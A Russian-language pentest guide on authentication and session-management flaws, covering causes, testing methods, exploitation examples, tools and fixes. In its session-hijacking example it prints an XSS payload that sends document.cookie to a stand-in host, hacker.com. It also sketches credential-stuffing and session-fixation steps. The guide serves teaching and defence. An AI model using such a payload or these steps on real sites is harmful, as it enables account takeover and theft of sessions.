

Эта категория посвящена защите «входных дверей» приложения. Если механизмы проверки личности пользователя слабы, атакующий может захватить чужой аккаунт, получить права администратора или провести массовый взлом учетных записей.

---

### **1. Общее описание**

Уязвимость возникает, когда приложение позволяет обходить процесс входа или красть активные сессии. Аутентификация — это подтверждение того, что пользователь тот, за кого себя выдает. Идентификация — это само указание (логин). Ошибки в обоих процессах ведут к полной потере конфиденциальности.

**Основные сценарии:**

- **Слабые пароли:** Разрешение использовать `123456` или пароли, совпадающие с логином.
    
- **Отсутствие защиты от перебора (Brute Force):** Приложение не блокирует попытки входа после 1000 неудачных попыток.
    
- **Предсказуемые Session ID:** Идентификаторы сессий слишком короткие или генерируются по шаблону.
    
- **Session Fixation:** Сессия не меняется после успешного входа (хакер подсовывает свой ID жертве).
    

---

### **2. Почему это возникает? (Корневые причины)**

- **Плохой UX против Безопасности:** Разработчики не хотят «мучить» пользователей капчей или требованием вводить 12 символов.
    
- **Отсутствие 2FA:** Полагание только на пароль (который может быть украден из другой базы).
    
- **Небезопасное хранение сессий:** ID сессии передается в URL-параметрах (`?session_id=...`) или хранится в `localStorage` без защиты от XSS.
    

---

### **3. Методология поиска (Как искать пентестеру)**

- **Тестирование Brute Force:**
    
    - Попытка отправить 100 запросов с разными паролями к одному логину.
        
    - Проверка наличия заголовков блокировки (Rate Limiting).
        
- **Анализ управления сессиями:**
    
    - Проверка Cookie: есть ли флаги `HttpOnly` (защита от кражи через JS) и `Secure` (только через HTTPS)?
        
    - Проверка жизни сессии: остается ли она активной после закрытия браузера или через 24 часа бездействия?
        
- **Credential Stuffing:**
    
    - Попытка входа под парами логин/пароль из общедоступных баз утечек.
        
- **Username Enumeration:**
    
    - Выдает ли сайт разную ошибку для «Неверный пароль» и «Пользователь не найден»? Если да, можно собрать список всех логинов в системе.

### **4. Как эксплуатировать (Примеры)**

#### **Пример 1: Credential Stuffing**

Хакер берет базу данных (например, от старой утечки форума) и с помощью скрипта проверяет эти данные на вашем сайте. Если пользователи ленивы и используют один пароль везде — хакер заходит в аккаунты без всякого взлома кода.

#### **Пример 2: Session Hijacking (Угон сессии)**

Если кука сессии не помечена флагом `HttpOnly`, хакер использует **XSS** для её кражи: `fetch('http://hacker.com/?c=' + document.cookie)`. Получив ID сессии, он вставляет его в свой браузер и мгновенно становится этим пользователем.

#### **Пример 3: Session Fixation**

1. Хакер заходит на сайт, получает `session_id=XYZ`.
    
2. Хакер присылает жертве ссылку `site.com/login?session_id=XYZ`.
    
3. Жертва логинится. Если сайт не сменил ID сессии на новый при входе, хакер теперь тоже залогинен под аккаунтом жертвы с тем же `XYZ`.

### **5. Инструменты для поиска**

|**Инструмент**|**Функция**|
|---|---|
|**Burp Suite Intruder**|Главный инструмент для перебора паролей и анализа ответов сервера.|
|**Hydra**|Быстрый консольный инструмент для брутфорса почти любых протоколов (HTTP, SSH, FTP).|
|**OWASP ZAP**|Включает модули для тестирования управления сессиями.|
|**Wfuzz**|Гибкий фаззер для поиска скрытых параметров аутентификации.|

### **6. Как исправить (Рекомендации разработчику)**

1. **Двухфакторная аутентификация (MFA/2FA):** Это лучший способ защиты. Даже если пароль украден, без кода из приложения (TOTP) или SMS хакер не войдет.
    
2. **Политика паролей:** Запретить использование топ-10 000 самых популярных паролей (библиотеки типа `zxcvbn`).
    
3. **Безопасные сессии:**
    
    - Генерировать новый ID сессии после каждого входа.
        
    - Использовать куки с флагами `HttpOnly`, `Secure`, `SameSite=Strict`.
        
4. **Rate Limiting:** Ограничивать количество попыток входа с одного IP и для одного логина.
    
5. **Generic Error Messages:** Всегда отвечать «Неверный логин или пароль», чтобы не давать подсказок о существовании пользователя.
